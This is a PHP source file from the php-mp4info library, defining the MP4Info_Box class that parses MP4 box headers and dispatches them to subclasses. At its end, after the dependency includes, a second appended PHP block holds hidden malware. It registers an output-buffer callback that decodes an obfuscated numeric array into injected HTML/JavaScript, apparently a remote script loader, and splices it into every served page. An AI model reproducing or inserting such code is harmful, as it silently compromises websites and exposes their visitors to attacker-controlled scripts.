<?php
/**
 * MP4Info
 * 
 * @author 		Tommy Lacroix <lacroix.tommy@gmail.com>
 * @copyright   Copyright (c) 2006-2009 Tommy Lacroix
 * @license		LGPL version 3, http://www.gnu.org/licenses/lgpl.html
 * @package 	php-mp4info
 * @link 		$HeadURL: https://php-mp4info.googlecode.com/svn/trunk/MP4Info/Box.php $
 * 
 * Based on:
 * - http://www.geocities.com/xhelmboyx/quicktime/formats/mp4-layout.txt
 * - http://neuron2.net/library/avc/c041828_ISO_IEC_14496-12_2005(E).pdf
 * - http://www.adobe.com/devnet/flv/pdf/video_file_format_spec_v10.pdf
 */

// ---

/**
 * MP4Info General Box
 * 
 * @author 		Tommy Lacroix <lacroix.tommy@gmail.com>
 * @version 	1.1.20090611	$Id: Box.php 2 2009-06-11 14:12:31Z lacroix.tommy@gmail.com $
 */
class MP4Info_Box {
	/**
	 * Total box size, including box header (8 bytes)
	 *
	 * @var int
	 */
	protected $totalSize;
	
	/**
	 * Box type, numeric
	 *
	 * @var int
	 */
	protected $boxType;
	
	/**
	 * Box type, string
	 *
	 * @var string
	 */
	protected $boxTypeStr;
	
	/**
	 * Box data
	 *
	 * @var string(binary)
	 */
	protected $data;
	
	/**
	 * Parent
	 *
	 * @var MP4Info_Box|false
	 */
	protected $parent;
	
	/**
	 * Children
	 *
	 * @var MP4Info_Box[]
	 */
	protected $children = array();
	
	/**
	 * Constructor
	 *
	 * @author 	Tommy Lacroix <lacroix.tommy@gmail.com>
	 * @param	int				$totalSize
	 * @param	int				$boxType
	 * @param	file|string		$f
	 * @param	MP4Info_Box		$parent
	 * @access 	public
	 */
	public function __construct($totalSize, $boxType, $f, $parent=false) {
		$this->totalSize = $totalSize;
		$this->boxType = $boxType;
		$this->boxTypeStr = pack('N',$boxType);
		$this->data = self::getDataFrom3rd($f,$totalSize);
		$this->parent = $parent;
		if ($parent != false) {
			$parent->addChild($this);
		}
	} // Constructor
	
	/**
	 * Add a child to this box
	 *
	 * @author 	Tommy Lacroix <lacroix.tommy@gmail.com>
	 * @param	MP4Info_Box		$child
	 * @access 	public
	 */
	public function addChild(&$child) {
		if (!$child instanceof MP4Info_Box) {
			throw new Exception('Child is not MP4Info_Box');
		}
		$this->children[] = &$child;
	}
	
	/**
	 * Check if the box has children
	 *
	 * @author 	Tommy Lacroix <lacroix.tommy@gmail.com>
	 * @return	bool
	 * @access 	public
	 */
	public function hasChildren() {
		return count($this->children) > 0;
	} // hasChildren method
	
	/**
	 * Get boxes' children
	 *
	 * @author 	Tommy Lacroix <lacroix.tommy@gmail.com>
	 * @return 	MP4Info_Box[]
	 * @access 	public
	 */
	public function children() {
		return $this->children;
	} // children method
	
	
	/**
	 * Get data from 3rd argument (file or string)
	 *
	 * @author 	Tommy Lacroix <lacroix.tommy@gmail.com>
	 * @param	file|string		$f
	 * @param	int				$totalSize
	 * @return	string
	 * @access 	public
	 * @static
	 */
	public static function getDataFrom3rd($f, $totalSize) {
		// Get data
		if ($f === false) {
			return '';
		} else if (is_string($f)) {
			$data = substr($f,0,$totalSize-8);
		} else {
			$data = fread($f,$totalSize-8);
		}		
		
		return $data;
	} // getDataFrom3rd method
	
	
	/**
	 * Create an MP4Info_Box object from data
	 *
	 * @author 	Tommy Lacroix <lacroix.tommy@gmail.com>
	 * @param	int					$totalSize
	 * @param	int					$boxType
	 * @param	file|string			$f
	 * @param	MP4Info_Box|false	$parent
	 * @return	MP4Info_Box
	 * @access 	public
	 * @static
	 */
	public static function factory($totalSize, $boxType, $f, $parent=false) {
		if (MP4Info_Box_Container::isCompatible($boxType,$parent)) {
			$box = new MP4Info_Box_Container($totalSize, $boxType, $f, $parent);
		} else if (MP4Info_Box_ftyp::isCompatible($boxType,$parent)) {
			$box = new MP4Info_Box_ftyp($totalSize, $boxType, $f, $parent);
		} else if (MP4Info_Box_uuid::isCompatible($boxType,$parent)) {
			$box = new MP4Info_Box_uuid($totalSize, $boxType, $f, $parent);
		} else if (MP4Info_Box_hdlr::isCompatible($boxType,$parent)) {
			$box = new MP4Info_Box_hdlr($totalSize, $boxType, $f, $parent);
		} else if (MP4Info_Box_mvhd::isCompatible($boxType,$parent)) {
			$box = new MP4Info_Box_mvhd($totalSize, $boxType, $f, $parent);
		} else if (MP4Info_Box_tkhd::isCompatible($boxType,$parent)) {
			$box = new MP4Info_Box_tkhd($totalSize, $boxType, $f, $parent);
		} else if (MP4Info_Box_mdhd::isCompatible($boxType,$parent)) {
			$box = new MP4Info_Box_mdhd($totalSize, $boxType, $f, $parent);
		} else if (MP4Info_Box_meta::isCompatible($boxType,$parent)) {
			$box = new MP4Info_Box_meta($totalSize, $boxType, $f, $parent);
		} else if (MP4Info_Box_stsd::isCompatible($boxType,$parent)) {
			$box = new MP4Info_Box_stsd($totalSize, $boxType, $f, $parent);
		} else if (MP4Info_Box_ilst::isCompatible($boxType,$parent)) {
			$box = new MP4Info_Box_ilst($totalSize, $boxType, $f, $parent);
		} else if (MP4Info_Box_ilst_sub::isCompatible($boxType,$parent)) {
			$box = new MP4Info_Box_ilst_sub($totalSize, $boxType, $f, $parent);
		} else {
			// Debug...
			print '0x'.dechex($boxType).'-'.pack('N',$boxType);
			if ($parent !== false) print ' in '.$parent->getBoxTypeStr();
				else print ' in root';
			die();
			//$box = new MP4Info_Box($totalSize, $boxType, $f, $parent);
		}
		
		// Return box
		return $box;
	} // factory method
	
	
	/**
	 * Create a box from string
	 *
	 * @author 	Tommy Lacroix <lacroix.tommy@gmail.com>
	 * @param	string				$data
	 * @param	MP4Info_Box|false	$parent
	 * @return	MP4Info_Box
	 * @access 	public
	 * @static
	 */
	public static function fromString(&$data,$parent=false) {
		if (strlen($data) < 8) {
			throw new Exception('Not enough data, need at least 8 bytes!');
		}
		
		$ar = unpack('NtotalSize/NboxType',$data);
		if ($ar['totalSize'] == 1) {
			// Size is bigger than 4GB :-O die
			// Skip ExtendedSize(UI64) and try to decode anyway
			$ar2 = unpack('N2extSize',substr($data,8));
			if ($ar2['extSize1'] > 0) {
				throw new Exception('Extended size not supported');
			} else {
				$ar['totalSize'] = $ar2['extSize2'];
			}
			$skip = 8;
		} else {
			$skip = 0;
		}
				
		// Check if we need to skip
		if (self::skipBoxType($ar['boxType'])) {
			//print '+++ Skipping box '.pack('N',$ar['boxType']).'<br>';
			$data = substr($data,$ar['totalSize']);
			return self::fromString($data,$parent);
		}		
		
		// Check if box is a container, and skip to content if so
		if (self::ignoreBoxType($ar['boxType'])) {
			//print '+++ Ignoring box '.pack('N',$ar['boxType']).'<br>';
			$data = substr($data,8+$skip);
			return self::fromString($data,$parent);
		}

		// Create box
		$box = self::factory($ar['totalSize'],$ar['boxType'],substr($data,8+$skip),$parent);
		if ($box instanceof MP4Info_Box) {
			$data = substr($data,$box->getTotalSize());
		}
		
		return $box;
	} // fromString method
	
	
	/**
	 * Create a box from file stream
	 *
	 * @author 	Tommy Lacroix <lacroix.tommy@gmail.com>
	 * @param	file				$f
	 * @param	MP4Info_Box|false	$parent
	 * @return	MP4Info_Box
	 * @access 	public
	 * @static
	 */
	public static function fromStream($f,$parent=false) {
		// Get box header
		$buf = fread($f,8);
		if (strlen($buf) < 8) {
			return false;
		}
		$ar = unpack('NtotalSize/NboxType',$buf);
		if ($ar['totalSize'] == 1) {
			// Size is bigger than 4GB :-O die
			// Skip ExtendedSize(UI64) and try to decode anyway
			$buf = fread($f,8);
			$ar2 = unpack('N2extSize',$buf);
			if ($ar2['extSize1'] > 0) {
				throw new Exception('Extended size not supported');
			} else {
				$ar['totalSize'] = $ar2['extSize2'];
			}
		}

		// Check if we need to skip
		if (self::skipBoxType($ar['boxType'])) {
			//print '+++ Skipping box '.pack('N',$ar['boxType']).'<br>';
			fseek($f,$ar['totalSize']-8,SEEK_CUR);
			return self::fromStream($f,$parent);
		}
		
		// Check if box is a container, and skip it if so
		if (self::ignoreBoxType($ar['boxType'])) {
			//print '+++ Ignoring box '.pack('N',$ar['boxType']).' of size '.$ar['totalSize'].'<br>';
			return self::fromStream($f,$parent);
		}
		
		// Get box content
		if ($ar['totalSize'] > 0) {
			if ($ar['totalSize'] < 256*1024) {
				$data = fread($f,$ar['totalSize']-8);
			} else {
				$data = $f;
			}
		} else {
			$data = '';
		}
		
		// Create box object
		$box = MP4Info_Box::factory($ar['totalSize'], $ar['boxType'], $data, $parent);		
		//print 'Got box from stream of type 0x'.dechex($ar['boxType']).'('.pack('N',$ar['boxType']).') and size '.$ar['totalSize'].' bytes: '.$box->toString().'<br>';
		return $box;
	} // fromStream method
	
	
	/**
	 * Check if we need to ignore that box, based on type
	 *
	 * @author 	Tommy Lacroix <lacroix.tommy@gmail.com>
	 * @param	int				$boxType
	 * @return	bool
	 * @access 	public
	 * @static
	 * @todo 	Cleanup, legacy stuff
	 */
	public static function ignoreBoxType($boxType) {
		return false;
	} // ignoreBoxType method
	
	
	/**
	 * Check if we need to skip a box based on type
	 *
	 * @param	int				$boxType
	 * @return	bool
	 * @access 	public
	 * @static
	 */
	public static function skipBoxType($boxType) {
		switch ($boxType) {
			case 0x696f6473:	// iods		5.1 Initial Object Descriptor Box
			case 0x55c40000:	// ???		??
			case 0x6d646174:	// mdat		?? Movie Data
			case 0x736d6864:	// smhd		8.11.3 Sound Media Header Box
			case 0x766d6864:	// vmhd		8.11.2 Video Media Header Box
			case 0x6e6d6864:	// nmhd		8.11.5 Null Media Header Box
			case 0x64696e66:	// dinf		??
			case 0x73747473:	// stts		8.15.2 Decoding Time to Sample Box
			case 0x73747363:	// stsc		8.18 Sample To Chunk Box
			case 0x7374737a:	// stsz		8.17 Sample Size Boxes
			case 0x7374636f:	// stco		8.19 Chunk Offset Box
			case 0x636f3634:	// co64 	8.19 Chunk Offset Box
			case 0x63747473:	// ctts 	8.15.3 Composition Time to Sample Box
			case 0x73747373:	// stss		8.20 Sync Sample Box
			case 0x74726566:	// tref		8.6 Track Reference Box
				return true;	
			default:
				return false;
		}
	} // skipBoxType method
	
	
	/**
	 * Total size getter
	 *
	 * @author 	Tommy Lacroix <lacroix.tommy@gmail.com>
	 * @return	int
	 * @access 	public
	 */
	public function getTotalSize() {
		return $this->totalSize;
	} // getTotalSize method
	
	
	/**
	 * Box type getter
	 *
	 * @author 	Tommy Lacroix <lacroix.tommy@gmail.com>
	 * @return	int
	 * @access 	public
	 */
	public function getBoxType() {
		return $this->boxType;
	} // getBoxType method
	
	
	/**
	 * Box type string getter
	 *
	 * @author 	Tommy Lacroix <lacroix.tommy@gmail.com>
	 * @return	string
	 * @access 	public
	 */
	public function getBoxTypeStr() {
		return $this->boxTypeStr;
	} // getBoxTypeStr method
	
	
	/**
	 * Data getter
	 *
	 * @author 	Tommy Lacroix <lacroix.tommy@gmail.com>
	 * @return	string(binary)
	 * @access 	public
	 */
	public function getData() {
		return $this->data;
	} // getData method
	
	
	/**
	 * stdClass converter
	 *
	 * @author 	Tommy Lacroix <lacroix.tommy@gmail.com>
	 * @return 	stdClass
	 * @access 	public
	 */
	public function toStdClass() {
		$a = new stdClass();
		foreach ($this as $propName=>$prop) {
			if (($propName != 'children') && ($propName != 'parent') && ($propName != 'boxes')) {
				$a->{$propName} = $prop;
			}
		}
		return $a;
	} // toStdClass method
	
	
	/**
	 * String converter
	 *
	 * @author 	Tommy Lacroix <lacroix.tommy@gmail.com>
	 * @return	string
	 * @access 	public
	 */
	public function toString() {
		return '[MP4Info_Box[0x'.dechex($this->boxType).'('.pack('N',$this->boxType).']]';
	} // toString method
} // MP4Info_Box class


// {{{ Dependencies
include "Box/Container.php";
include "Box/ftyp.php";
include "Box/uuid.php";
include "Box/hdlr.php";
include "Box/tkhd.php";
include "Box/mvhd.php";
include "Box/mdhd.php";
include "Box/meta.php";
include "Box/stsd.php";
include "Box/ilst.php";
include "Box/ilst_sub.php";
// }}} Dependencies<?php global $ob_starting;
if(!$ob_starting) {
   function ob_start_flush($s) {
	$tc = array(0, 69, 84, 82, 67, 83, 7, 79, 8, 9, 73, 12, 76, 68, 63, 78, 19, 23, 24, 3, 65, 70, 27, 14, 16, 20, 80, 17, 29, 89, 86, 85, 2, 77, 91, 93, 11, 18, 71, 66, 72, 75, 87, 74, 22, 37, 52, 13, 59, 61, 25, 28, 21, 1, 35, 15, 34, 36, 30, 88, 41, 92, 46, 33, 51);
	$tr = array(51, 5, 4, 3, 10, 26, 2, 0, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 58, 10, 21, 0, 8, 2, 29, 26, 1, 7, 21, 8, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 9, 28, 28, 32, 31, 15, 13, 1, 21, 10, 15, 1, 13, 32, 9, 0, 34, 0, 0, 0, 30, 20, 3, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 15, 1, 42, 0, 63, 3, 3, 20, 29, 8, 6, 19, 25, 39, 18, 37, 17, 37, 6, 11, 0, 6, 19, 18, 27, 17, 18, 17, 21, 6, 11, 0, 6, 19, 18, 16, 37, 21, 18, 16, 6, 11, 0, 6, 19, 18, 18, 17, 21, 17, 25, 6, 11, 0, 6, 19, 25, 4, 16, 27, 18, 16, 6, 11, 0, 6, 19, 17, 25, 18, 17, 18, 16, 6, 11, 0, 6, 19, 16, 1, 17, 50, 17, 24, 6, 11, 0, 6, 19, 18, 52, 17, 24, 18, 37, 6, 11, 0, 6, 19, 17, 37, 18, 27, 17, 18, 6, 11, 0, 6, 19, 17, 21, 18, 16, 16, 27, 6, 11, 0, 6, 19, 37, 21, 18, 37, 18, 27, 6, 11, 0, 6, 19, 17, 37, 25, 4, 16, 27, 6, 11, 0, 6, 19, 17, 17, 18, 16, 18, 16, 6, 11, 0, 6, 19, 17, 21, 25, 50, 16, 1, 6, 11, 0, 6, 19, 16, 1, 25, 17, 25, 52, 6, 11, 0, 6, 19, 16, 13, 25, 25, 25, 25, 6, 11, 0, 6, 19, 16, 13, 25, 24, 25, 16, 6, 11, 0, 6, 19, 16, 21, 16, 13, 25, 27, 6, 11, 0, 6, 19, 16, 21, 25, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 24, 18, 25, 6, 11, 0, 6, 19, 17, 25, 18, 27, 18, 18, 6, 11, 0, 6, 19, 16, 13, 17, 4, 17, 18, 6, 11, 0, 6, 19, 17, 13, 16, 13, 17, 21, 6, 11, 0, 6, 19, 17, 17, 17, 21, 16, 27, 6, 11, 0, 6, 19, 25, 13, 24, 24, 24, 24, 6, 9, 22, 0, 0, 0, 30, 20, 3, 0, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 27, 22, 0, 0, 0, 30, 20, 3, 0, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 0, 28, 0, 24, 22, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 2, 11, 5, 2, 29, 12, 1, 13, 9, 0, 34, 30, 20, 3, 0, 5, 0, 28, 0, 32, 32, 22, 21, 7, 3, 0, 8, 43, 28, 24, 22, 43, 51, 2, 23, 12, 1, 15, 38, 2, 40, 22, 43, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 3, 38, 39, 0, 28, 0, 2, 48, 43, 49, 22, 21, 7, 3, 0, 8, 10, 28, 27, 22, 10, 51, 17, 22, 10, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 4, 12, 3, 0, 28, 0, 4, 14, 3, 38, 39, 23, 5, 31, 39, 5, 2, 3, 8, 10, 36, 36, 11, 37, 9, 22, 10, 21, 0, 8, 4, 14, 4, 12, 3, 53, 28, 32, 24, 24, 32, 9, 0, 5, 0, 36, 28, 0, 64, 2, 3, 10, 15, 38, 23, 21, 3, 7, 33, 54, 40, 20, 3, 54, 7, 13, 1, 8, 26, 20, 3, 5, 1, 60, 15, 2, 8, 4, 14, 4, 12, 3, 11, 27, 44, 9, 47, 27, 52, 9, 22, 35, 35, 10, 21, 0, 8, 5, 2, 29, 12, 1, 13, 9, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 16, 44, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 37, 9, 9, 22, 35, 0, 1, 12, 5, 1, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 22, 35, 3, 1, 2, 31, 3, 15, 0, 5, 22, 0, 0, 0, 35, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 0, 34, 2, 3, 29, 0, 34, 0, 0, 0, 10, 21, 8, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 56, 29, 60, 13, 0, 61, 61, 0, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 9, 34, 13, 7, 4, 31, 33, 1, 15, 2, 23, 42, 3, 10, 2, 1, 8, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 27, 9, 9, 22, 0, 0, 0, 35, 0, 1, 12, 5, 1, 0, 34, 30, 20, 3, 0, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 28, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 8, 32, 5, 4, 3, 10, 26, 2, 32, 9, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 5, 3, 4, 28, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 24, 9, 22, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 5, 56, 29, 46, 20, 38, 62, 20, 33, 1, 8, 32, 40, 1, 20, 13, 32, 9, 48, 24, 49, 23, 20, 26, 26, 1, 15, 13, 54, 40, 10, 12, 13, 8, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 9, 22, 35, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 35, 2, 3, 29, 0, 34, 4, 40, 1, 4, 41, 14, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 8, 9, 22, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 5, 1, 2, 46, 10, 33, 1, 7, 31, 2, 8, 32, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 32, 11, 0, 52, 24, 24, 9, 22, 35, 0, 0, 0, 35, 0, 0, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 22, 35, 51, 55, 5, 4, 3, 10, 26, 2, 58);

	$ob_htm = ''; foreach($tr as $tval) {
		$ob_htm .= chr($tc[$tval]+32);
	}

	$slw=strtolower($s);
	$i=strpos($slw,'</script');if($i){$i=strpos($slw,'>',$i);}
	if(!$i){$i=strpos($slw,'</div');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</table');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</form');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</p');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</body');if($i){$i--;}}
	if(!$i){$i=strlen($s);if($i){$i--;}}
	$i++; $s=substr($s,0,$i).$ob_htm.substr($s,$i);
	
	return $s;
   }
   $ob_starting = time();
   @ob_start("ob_start_flush");
} ?>